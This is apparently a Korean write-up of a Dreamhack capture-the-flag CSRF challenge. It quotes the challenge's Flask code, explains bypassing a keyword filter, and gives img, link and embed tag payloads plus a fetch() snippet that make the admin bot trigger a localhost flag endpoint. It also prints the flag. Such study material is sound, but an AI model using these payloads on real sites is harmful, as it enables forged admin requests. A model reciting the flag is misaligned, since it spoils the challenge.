@@ -1,0 +1,118 @@
+[Notice] flag is DH{11a230801ad0b80d52b996cbe203e83d}
+
+웹사이트 구조를 보면 csrf는 테스느 
+memo는 flag 획득 시 flag를 보여주는 용이고 
+notice flag는 flag 획득을 위한 조건을 체크하기 위한 곳 
+그리고 csrf를 입력하는 곳이다python2.7
+
+@app.route('/csrf')
+def csrf():
+    csrf = request.args.get('csrf', '').lower()
+    xss_filter = ['frame', 'script', 'on']
+    for _ in xss_filter:
+        csrf = csrf.replace(_, '*')
+    return csrf
+
+이부분을 보면 csrf에 filtering이 적용된걸 알 수 있다.
+frame, script, on은 filtering되므로  <scscript> 이런 식으로 쓰던가 아니면 아에 저 세단어가 들어가지 않은 <a > <img > 등을 사용하면 된다.
+
+@app.route('/admin/notice_flag')
+def admin_notice_flag():
+    global memo_text
+    if request.remote_addr != '127.0.0.1':
+        return 'Access Denied'
+    if request.args.get('userid', '') != 'admin':
+        return 'Your not admin'
+    memo_text += f'[Notice] flag is {FLAG}\n'
+    return 'Ok'
+
+/admin/notice_flag에서 검사하므로 csrf는 /admin/notice_flag?name=value가 된다
+userid 가 admin이 되어야 하므로 /admin/notice_flag?userid=admin이 되고 이걸 flag페이지에서 사용해야 된다.
+
+보통 <img src="http://host1.dreamhack.games:18001/admin/notice_flag?userid=admin">이런식으로 사용하면 되지만 
+/admin/notice_flag의 첫번 쨰 조건이 127.0.0.1이므로 http://host1.dreamhack.games:18001/admin/notice_flag?userid=admin 으로 하면 안된다.
+
+def read_url(url, cookie={'name': 'name', 'value': 'value'}):
+    cookie.update({'domain':'127.0.0.1'})
+    try:
+        options = webdriver.ChromeOptions()
+        for _ in ['headless', 'window-size=1920x1080', 'disable-gpu', 'no-sandbox', 'disable-dev-shm-usage']:
+            options.add_argument(_)
+        driver = webdriver.Chrome('/chromedriver', options=options)
+        driver.implicitly_wait(3)
+        driver.set_page_load_timeout(3)
+        driver.get('http://127.0.0.1:8000/')
+        driver.add_cookie(cookie)
+        driver.get(f'http://127.0.0.1:8000/csrf?csrf={urllib.parse.quote(url)}')
+    except:
+        driver.quit()
+        return False
+    driver.quit()
+    return True
+
+이 부분과 flag 페이지를 보면 http://127.0.0.1:8000/csrf?csrf={사용자 입력}이런 형식으로 되어 있다. 
+driver에서 http://127.0.0.1:8000/csrf?csrf={<img src="/admin/notice_flag?userid=admin">}의 주소로 GET 요청을 한다.
+그러면 서버는 <img src="/admin/notice_flag?userid=admin">을 바디에 담아서 repoonse해서 src에서 이미지를 받으려고 요청한다.
+이 경우 요청 주소는 자동으로 http://127.0.0.1:8000/admin/notice_flag 가 된다.
+그래서 http://host1.dreamhack.games:18001이 부분을 작성할 필요가 없다.
+
+결국 flag에서 
+<img src="/admin/notice_flag?userid=admin">
+이란 형식으로 작성하면 flag를 획득할 수 있다.
+
+
+
+다른 사람 답 :
+    문제 페이지에 접속하면 이전 xss-1 문제와 유사한 형태의 UI를 확인할 수 있었습니다. 따라서 이 문제 또한 csrf 공격을 통해 memo 페이지에 flag를 띄우는 것이 해결 방법이지 않을까 하고 시작하였습니다.
+
+    전체 소스코드를 확인해 보았을 때는 우선 csrf 함수를 통해서 frame, script, on 세 개의 단어에 대해 * 문자로 replace를 하고, memo_text 변수가 global 변수라는 것이었습니다.
+
+    문제를 해결하기 위한 조건은 localhost 주소와 get argument로 userid에 admin 값을 넣어 /admin/notice_flag 주소에 접속할 필요가 있다는 것을 알 수 있었습니다.
+
+    script의 전달은 flag 페이지에서 csrf 인자를 통해 전달할 수 있을 것으로 보였습니다. 힌트의 경우 client-side basic 강의에 csrf 부분이 있었기에 해당 내용을 참조하면 img 태그를 사용한 script 삽입이 가능하였습니다. 따라서 다음과 같이 script를 작성하였습니다.
+
+    <img src="/admin/notice_lfag?userid=admin">
+
+
+
+    <link rel="stylesheet" href="/admin/notice_flag?userid=admin">
+
+
+    <embed src=“http://localhost:8000/admin/notice_flag?userid=admin” width=“640” height=“480”>
+
+
+
+    /admin/notice_flag를 내가 접속하지 않고 서버가 접속하게만 한다면 누구나 /memo에 가서 flag 확인 가능.
+    app.py의 read_url 함수는 서버측에서 GET request를 하니까 여기를 공략해야 함.
+
+    F12를 눌러 개발자 도구를 열고 콘솔창에 다음 자바스크립트 코드를 입력
+
+    fetch('/flag', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'csrf=<img src="http://127.0.0.1:8000/admin/notice_flag?userid=admin">',
+    }).then((res) => {
+        console.log("STATUS:", res.status);
+        res.text().then(console.log);
+    }).catch((e) => {
+        console.log("ERROR:", e);
+    });
+    또는 /flag에가서 입력폼에 <img src="http://127.0.0.1:8000/admin/notice_flag?userid=admin"> 을 입력하고 제출
+
+    그리고 /memo로 가면 flag 획득.
+    작동원리는
+
+    1. POST 요청을 받은 서버는 body에 있는 <img src="http://127.0.0.1:8000/admin/notice_flag?userid=admin">을 read_url 함수로 넘김
+    2. read_url 함수는 위의 것을 넣어 'http://127.0.0.1:8000/csrf?csrf=<img src="http://127.0.0.1:8000/admin/notice_flag?userid=admin">'의 주소로 크롬을 통해 GET 요청을 함.
+    3. 요청을 받은 서버는 <img src="http://127.0.0.1:8000/admin/notice_flag?userid=admin">을 body에 담아서 response함.
+    4. 크롬은 response로 받은 <img src="http://127.0.0.1:8000/admin/notice_flag?userid=admin">을 html소스로 해석하고 실행해서 'http://127.0.0.1:8000/admin/notice_flag?userid=admin'에서 이미지를 받으려 함.
+    5. /admin/notice_flag으로 127.0.0.1(서버)의 요청이 들어오면서 조건문을 통과하고 memo에는 flag가 입력됨.
+    6. memo에 가서 flag를 확인.
+
+
+
+
+
+
